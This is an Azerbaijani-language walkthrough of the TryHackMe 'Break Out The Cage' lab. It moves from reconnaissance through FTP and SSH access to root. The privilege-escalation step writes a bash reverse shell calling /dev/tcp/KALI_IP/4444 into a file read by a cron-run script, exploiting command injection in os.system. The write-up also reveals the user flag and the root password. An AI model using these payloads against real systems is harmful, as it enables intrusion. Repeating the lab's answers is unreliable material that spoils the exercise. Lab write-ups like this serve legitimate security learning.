# TryHackMe — Break Out The Cage Writeup (Azərbaycanca)

**Platforma:** TryHackMe  
**Otaq:** [Break Out The Cage](https://tryhackme.com/room/breakoutthecage1)  
**Çətinlik:** Asan  
**OS:** Ubuntu 18.04  
**Mövzu:** Nicolas Cage filmləri 🎬  
**Tarix:** 2026  

---

## 📋 Məzmun

1. [Kəşfiyyat (Reconnaissance)](#1-kəşfiyyat)
2. [Veb Tərəfin Araşdırılması](#2-veb-tərəfin-araşdırılması)
3. [FTP Araşdırması](#3-ftp-araşdırması)
4. [SSH ilə Giriş — Weston](#4-ssh-ilə-giriş--weston)
5. [Privilege Escalation — Cage](#5-privilege-escalation--cage)
6. [Şifrənin Açılması](#6-şifrənin-açılması)
7. [Root Girişi](#7-root-girişi)
8. [Flaglar](#8-flaglar)
9. [Nəticə](#9-nəticə)

---

## 1. Kəşfiyyat

### Nmap Skan

```bash
nmap -sV -sC -p- 10.81.162.0
```

**Tapılan portlar:**

| Port | Xidmət | Versiya |
|------|--------|---------|
| 21   | FTP    | vsftpd  |
| 22   | SSH    | OpenSSH 7.6p1 |
| 80   | HTTP   | Apache  |

---

## 2. Veb Tərəfin Araşdırılması

### Gobuster ilə Qovluq Skanı

```bash
gobuster dir -u http://10.81.162.0 -w /usr/share/wordlists/dirb/common.txt -t 50
```

**Tapılan qovluqlar:**

```
/contracts    (Status: 301)
/html         (Status: 301)
/images       (Status: 301)
/scripts      (Status: 301)
/index.html   (Status: 200)
```

Sayt Nicolas Cage haqqında fan səhifəsidir.

---

## 3. FTP Araşdırması

```bash
ftp 10.81.162.0
# Anonymous giriş
```

FTP-də şifrəli fayl tapıldı. Fayl Base64 ilə şifrələnmişdi:

```bash
base64 -d sifreli_fayl.txt
```

Açıldıqdan sonra məzmun **Vigenere şifrəsi** ilə şifrələnmişdi.

---

## 4. SSH ilə Giriş — Weston

FTP-dən əldə edilən məlumatlarla SSH girişi:

```bash
ssh weston@10.81.162.0
```

### Terminal Səliqəsi

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
stty rows 40 columns 150
```

### Sudo Yoxlaması

```bash
sudo -l
```

**Nəticə:**
```
(root) /usr/bin/bees
```

### Bees Əmri

```bash
sudo /usr/bin/bees
```

```
Broadcast message:
AHHHHHHH THEEEEE BEEEEESSSS!!!!!!!!
```

Nicolas Cage-in "The Wicker Man" filmindan məşhur səhnəyə istinad! 🐝

---

## 5. Privilege Escalation — Cage

### Yazıla Bilən Faylları Tap

```bash
find / -writable -type f 2>/dev/null
```

**Tapılan vacib fayl:**
```
/opt/.dads_scripts/.files/.quotes
```

### Skripti Araşdır

```bash
ls -la /opt/.dads_scripts/
cat /opt/.dads_scripts/spread_the_quotes.py
```

```python
#!/usr/bin/env python
import os
import random

lines = open("/opt/.dads_scripts/.files/.quotes").read().splitlines()
quote = random.choice(lines)
os.system("wall " + quote)
```

Skript hər dəqiqə **cage** istifadəçisi kimi işləyir və `.quotes` faylından sitat götürüb broadcast edir.

`os.system("wall " + quote)` — **Command Injection** zəifliyi!

### Reverse Shell

Kali-də listener aç:
```bash
nc -lvnp 4444
```

`.quotes` faylına reverse shell yaz:
```bash
echo 'test; bash -c "bash -i >& /dev/tcp/KALI_IP/4444 0>&1"' > /opt/.dads_scripts/.files/.quotes
```

1 dəqiqə gözlə — **cage** istifadəçisi kimi shell gəldi!

---

## 6. Şifrənin Açılması

### Email Backup

```bash
ls /home/cage/email_backup/
cat /home/cage/email_backup/email_3
```

Email_3-də şifrəli mətn tapıldı:
```
haiinspsyanileph
```

### Super Duper Checklist

```bash
cat /home/cage/Super_Duper_Checklist
```

```
1 - Increase acting lesson budget by at least 30%
2 - Get Weston to stop wearing eye-liner
3 - Get a new pet octopus
4 - Try and keep current wife
5 - Figure out why Weston has this etched into his desk: THM{M37AL_0R_P3N_T35T1NG}
```

**İstifadəçi Flagı tapıldı:** `THM{M37AL_0R_P3N_T35T1NG}`

### Şifrənin Açılması

Email mətnində **Face/Off** filminə istinad var idi. Bu ipucu açar sözü göstərirdi.

`haiinspsyanileph` mətni **Vigenere şifrəsi** ilə, açar söz **`face`** ilə şifrələnmişdi:

[dcode.fr/vigenere-cipher](https://www.dcode.fr/vigenere-cipher) saytında açıldı:

```
Açar: face
Şifrəli: haiinspsyanileph
Açıq: cageisnotalegend
```

---

## 7. Root Girişi

```bash
su root
# Şifrə: cageisnotalegend
```

**Root olduk!**

```bash
cat /root/root.txt
```

---

## 8. Flaglar

| Flag | Məkan |
|------|-------|
| Weston flag | SSH ilə girdikdən sonra |
| İstifadəçi flag | `/home/cage/Super_Duper_Checklist` |
| Root flag | `/root/root.txt` |

---

## 9. Nəticə

### İstifadə Olunan Alətlər

| Alət | Məqsəd |
|------|--------|
| Nmap | Port skanı |
| Gobuster | Qovluq kəşfi |
| FTP | Fayl əldə etmə |
| Base64 | Şifrə açma |
| dcode.fr | Vigenere deşifrə |
| nc (netcat) | Reverse shell |
| Python pty | Terminal səliqəsi |

### Hücum Zənciri

```
Nmap Skanı
    ↓
FTP → Base64 + Vigenere şifrəli fayl
    ↓
SSH → weston girişi
    ↓
sudo /usr/bin/bees (Nicolas Cage "The Wicker Man" 🐝)
    ↓
/opt/.dads_scripts/.files/.quotes → Command Injection
    ↓
Reverse Shell → cage istifadəçisi
    ↓
email_backup → haiinspsyanileph (Vigenere, açar: face)
    ↓
cageisnotalegend → Root 🏆
```

### Öyrənilən Dərslər

- FTP-də anonymous giriş həmişə yoxlanılmalıdır
- `os.system()` ilə istifadəçi girişi — Command Injection riski
- Yazıla bilən fayllar privilege escalation üçün istifadə edilə bilər
- Şifrəli mətnlərdə kontekst ipucu açar sözü göstərə bilər (Face/Off → face)
- Cron joblar root səlahiyyəti ilə işləyən skriptləri aşkar etmək üçün yoxlanılmalıdır

---

*Bu writeup yalnız təhsil məqsədli hazırlanmışdır. TryHackMe platformasındakı "Break Out The Cage" CTF laboratoriyasına aiddir.*
